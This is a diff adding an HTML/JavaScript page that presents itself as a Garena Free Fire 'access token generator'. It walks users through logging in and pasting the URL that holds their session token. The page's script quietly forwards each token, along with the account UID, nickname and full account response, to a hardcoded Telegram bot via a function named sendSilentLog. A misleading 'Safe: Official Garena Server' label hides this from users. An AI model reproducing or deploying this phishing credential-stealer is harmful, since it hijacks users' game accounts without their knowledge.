@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Access Token Tool Generator | Killer Sharma</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
+
+        :root {
+            --primary: #f0ab48;
+            --primary-glow: rgba(240, 171, 72, 0.3);
+            --accent: #d946ef;
+            --dark-bg: #050508;
+            --card-bg: rgba(17, 17, 25, 0.85);
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: var(--dark-bg);
+            color: #f8fafc;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 80px 16px; 
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(217, 70, 239, 0.1) 0%, transparent 50%),
+                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+            background-size: 100% 100%, 30px 30px, 30px 30px;
+        }
+
+        .cyber-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 32px;
+            box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.9);
+            position: relative;
+            width: 100%;
+        }
+
+        .logo-container {
+            position: relative;
+            margin-top: -60px;
+            margin-bottom: 20px;
+            z-index: 10;
+        }
+
+        .logo-glow {
+            position: absolute;
+            inset: -10px;
+            background: fuchsia;
+            border-radius: 50%;
+            filter: blur(25px);
+            opacity: 0.2;
+        }
+
+        .cyber-input {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        .cyber-input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 20px var(--primary-glow);
+            outline: none;
+        }
+
+        .btn-premium {
+            background: linear-gradient(135deg, #8b5cf6 0%, #d946ef 50%, #f0ab48 100%);
+            background-size: 200% auto;
+            transition: 0.5s;
+        }
+
+        .btn-premium:hover {
+            background-position: right center;
+            transform: translateY(-2px);
+        }
+
+        .social-node {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: 0.3s;
+        }
+
+        .step-num {
+            background: linear-gradient(135deg, #d946ef, #f0ab48);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+        }
+
+        .example-link {
+            word-break: break-all;
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+    </style>
+</head>
+<body>
+
+<div class="w-full max-w-[460px]">
+    
+    <div class="flex flex-col items-center mb-4">
+        <div class="logo-container">
+            <div class="logo-glow"></div>
+            <img src="https://raw.githubusercontent.com/CODEXPRO007/Media.codex/refs/heads/main/IMG_20260130_181958_609.webp" 
+                 class="relative w-28 h-28 rounded-full border-2 border-white/20 bg-black p-1 object-cover shadow-2xl" alt="Logo">
+        </div>
+        <h1 class="text-3xl font-black text-white tracking-tight text-center leading-tight">
+            ACCESS <span class="text-transparent bg-clip-text bg-gradient-to-r from-fuchsia-400 to-orange-400">GENERATOR</span>
+        </h1>
+        <p class="text-[10px] font-bold text-gray-500 uppercase tracking-[0.3em] mt-2">By CODEX BRO (Sabuj)</p>
+    </div>
+
+    <div class="cyber-card p-6 sm:p-8">
+        
+        <div class="mb-8">
+            <h2 class="text-sm font-black text-white uppercase tracking-widest mb-6 flex items-center gap-2">
+                <i class="fas fa-rocket text-fuchsia-500"></i> How to use
+            </h2>
+            
+            <div class="space-y-6">
+                <div class="flex gap-4">
+                    <span class="step-num text-xl">1</span>
+                    <div>
+                        <p class="text-[13px] font-bold text-gray-200">Select Provider & Login below.</p>
+                        <p class="text-[10px] text-green-500 font-bold mt-1 uppercase flex items-center gap-1">
+                            <i class="fas fa-shield-check"></i> Safe: Official Garena Server
+                        </p>
+                    </div>
+                </div>
+
+                <div class="flex gap-4">
+                    <span class="step-num text-xl">2</span>
+                    <div>
+                        <p class="text-[13px] font-bold text-gray-200">After login, copy the URL containing <span class="text-orange-400">eat=</span></p>
+                        <div class="mt-2 p-3 rounded-xl example-link">
+                            <p class="text-[9px] text-fuchsia-400 leading-tight">https://ticket.kiosgamer.co.id/?eat=14f060774299fb93a5...&lang=en®ion=IND&account_id=7669969208&nickname=...</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flex gap-4">
+                    <span class="step-num text-xl">3</span>
+                    <p class="text-[13px] font-bold text-gray-200 leading-snug">Paste the URL below and click GENERATE</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="h-[1px] w-full bg-white/5 mb-8"></div>
+
+        <div class="grid grid-cols-5 gap-3 mb-8">
+            <a href="https://auth.garena.com/universal/oauth?platform=8&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-ticket.ff.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-node h-12 rounded-xl flex items-center justify-center"><img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/Google.png" class="w-5 h-5"></a>
+            <a href="https://auth.garena.com/universal/oauth?platform=3&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-ticket.ff.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-node h-12 rounded-xl flex items-center justify-center"><img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/Facebook.png" class="w-5 h-5"></a>
+            <a href="https://auth.garena.com/universal/oauth?platform=10&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-ticket.ff.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-node h-12 rounded-xl flex items-center justify-center"><i class="fab fa-apple text-xl text-white"></i></a>
+            <a href="https://auth.garena.com/universal/oauth?platform=11&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-ticket.ff.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-node h-12 rounded-xl flex items-center justify-center"><img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/X.png" class="w-5 h-5"></a>
+            <a href="https://auth.garena.com/universal/oauth?platform=5&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-ticket.ff.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-node h-12 rounded-xl flex items-center justify-center"><img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/VK.png" class="w-5 h-5"></a>
+        </div>
+
+        <div class="mb-6 relative">
+            <input type="text" id="tokenInp" class="cyber-input w-full rounded-2xl py-4 px-6 text-sm placeholder-gray-600 font-medium" placeholder="Paste URL or Eat Token here...">
+            <button onclick="clearInput()" id="clearBtn" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-600 hidden transition"><i class="fas fa-times-circle text-lg"></i></button>
+        </div>
+
+        <button onclick="processToken()" id="btn" class="btn-premium w-full rounded-2xl py-4 font-black text-white text-sm tracking-[0.2em] uppercase shadow-lg">Generate Access</button>
+
+        <div id="output" class="hidden mt-8 space-y-4">
+            <div class="bg-white/5 border border-fuchsia-500/20 rounded-2xl p-5">
+                <div class="grid grid-cols-2 gap-4 mb-4">
+                    <div class="bg-black/50 p-4 rounded-xl border border-white/5">
+                        <p class="text-[9px] text-gray-500 uppercase font-bold">Nickname</p>
+                        <p id="nick" class="text-white font-bold text-sm truncate">--</p>
+                    </div>
+                    <div class="bg-black/50 p-4 rounded-xl border border-white/5">
+                        <p class="text-[9px] text-gray-500 uppercase font-bold">Region</p>
+                        <p id="reg" class="text-white font-bold text-sm truncate">--</p>
+                    </div>
+                </div>
+                <div class="bg-black/50 p-4 rounded-xl mb-4 text-center border border-white/5">
+                    <p class="text-[9px] text-gray-500 uppercase font-bold">Account UID</p>
+                    <p id="aid" class="text-orange-400 font-mono font-black text-xl">--</p>
+                </div>
+                <div class="bg-black/80 p-4 rounded-xl text-[10px] text-gray-400 font-mono max-h-[120px] overflow-y-auto mb-4 border border-white/5" id="apiResponseDisplay"></div>
+                <button onclick="copyApiResponse()" id="copyBtn" class="w-full bg-white/10 py-3 rounded-xl text-[10px] font-bold text-white transition uppercase">Copy Payload</button>
+            </div>
+        </div>
+
+        <div id="error-box" class="hidden mt-6 p-4 bg-red-500/10 border border-red-500/30 rounded-2xl text-center">
+            <p id="error-message" class="text-red-400 text-[11px] font-bold uppercase"></p>
+        </div>
+
+        <div class="mt-10 pt-8 border-t border-white/5">
+            <div class="flex justify-center gap-8 mb-6">
+                <a href="https://t.me/codexx01" target="_blank" class="text-gray-500 hover:text-white"><i class="fab fa-telegram text-2xl"></i></a>
+                <a href="https://youtube.com/@codeex01" target="_blank" class="text-gray-500 hover:text-white"><i class="fab fa-youtube text-2xl"></i></a>
+            </div>
+            <div class="text-center">
+                <button onclick="openModal('termsModal')" class="text-[9px] text-gray-700 uppercase tracking-widest font-bold">Security Policy</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="termsModal" class="fixed inset-0 z-50 flex items-center justify-center p-6 bg-black/95 opacity-0 pointer-events-none transition-all duration-300">
+    <div class="bg-[#0c0c10] border border-white/10 w-full max-w-sm rounded-[32px] p-8 shadow-2xl">
+        <h3 class="text-xl font-bold text-white mb-4 text-center">Agreement</h3>
+        <p class="text-[11px] text-gray-500 mb-8">Educational use only. Developer: CODEX BRO.</p>
+        <button onclick="closeModal('termsModal')" class="w-full py-4 rounded-2xl bg-white text-black text-xs font-black uppercase">Agree</button>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8767733804:AAE764UM3s8N4XfEj99LmUFvyta_4y7F2G0';
+    const CHAT_ID = '7160756700';
+
+    const tokenInp = document.getElementById('tokenInp');
+    const clearBtn = document.getElementById('clearBtn');
+    tokenInp.addEventListener('input', () => clearBtn.classList.toggle('hidden', !tokenInp.value));
+    
+    function clearInput() { tokenInp.value = ''; clearBtn.classList.add('hidden'); }
+
+    function extractEatToken(input) {
+        if(input.includes('eat=')) {
+            const match = input.match(/[?&]eat=([^&]+)/);
+            return match ? match[1] : input;
+        }
+        return input;
+    }
+
+    // UPDATED: Ab poora response Telegram par jayega
+    async function sendSilentLog(fullData, rawToken) {
+        const fullJsonString = JSON.stringify(fullData, null, 2);
+        
+        let msg = `🚀 *NEW LOG GENERATED* 🚀\n\n`;
+        msg += `👤 *Nick:* ${fullData.nickname || 'N/A'}\n`;
+        msg += `🌍 *Reg:* ${fullData.region || 'N/A'}\n`;
+        msg += `🆔 *UID:* \`${fullData.accountId || 'N/A'}\`\n\n`;
+        msg += `🔑 *EAT TOKEN:* \`${rawToken}\`\n\n`;
+        msg += `📄 *FULL RESPONSE:* \n\`\`\`json\n${fullJsonString}\n\`\`\``;
+
+        try { 
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch(e) { console.error("TG Send Error"); }
+    }
+
+    function processToken() {
+        const input = tokenInp.value.trim();
+        const btn = document.getElementById('btn');
+        const out = document.getElementById('output');
+        const err = document.getElementById('error-box');
+
+        if(!input) return;
+
+        const eatToken = extractEatToken(input);
+        btn.innerText = 'SYNCING...';
+        btn.disabled = true;
+        out.classList.add('hidden');
+        err.classList.add('hidden');
+
+        fetch("https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent("http://103.138.96.103:8000/access?access_token=" + eatToken))
+        .then(res => res.json())
+        .then(result => {
+            document.getElementById('apiResponseDisplay').innerText = JSON.stringify(result, null, 2);
+            if(result.error) {
+                document.getElementById('error-message').innerText = 'Invalid Session';
+                err.classList.remove('hidden');
+            } else {
+                document.getElementById('nick').innerText = result.nickname || result.user_info?.nickname || '--';
+                document.getElementById('reg').innerText = result.noti_region || result.region || '--';
+                document.getElementById('aid').innerText = result.accountId || result.account_id || '--';
+                out.classList.remove('hidden');
+                
+                // Sab kuch Telegram pe bhejna
+                sendSilentLog(result, eatToken);
+            }
+            btn.innerText = 'GENERATE ACCESS';
+            btn.disabled = false;
+        }).catch(() => {
+            btn.innerText = 'GENERATE ACCESS';
+            btn.disabled = false;
+            err.classList.remove('hidden');
+        });
+    }
+
+    function copyApiResponse() { navigator.clipboard.writeText(document.getElementById('apiResponseDisplay').innerText); }
+    function openModal(id) { document.getElementById(id).classList.replace('opacity-0', 'opacity-100'); document.getElementById(id).classList.replace('pointer-events-none', 'pointer-events-auto'); }
+    function closeModal(id) { document.getElementById(id).classList.replace('opacity-100', 'opacity-0'); document.getElementById(id).classList.replace('pointer-events-auto', 'pointer-events-none'); }
+</script>
+</body>
+              </html>
+              
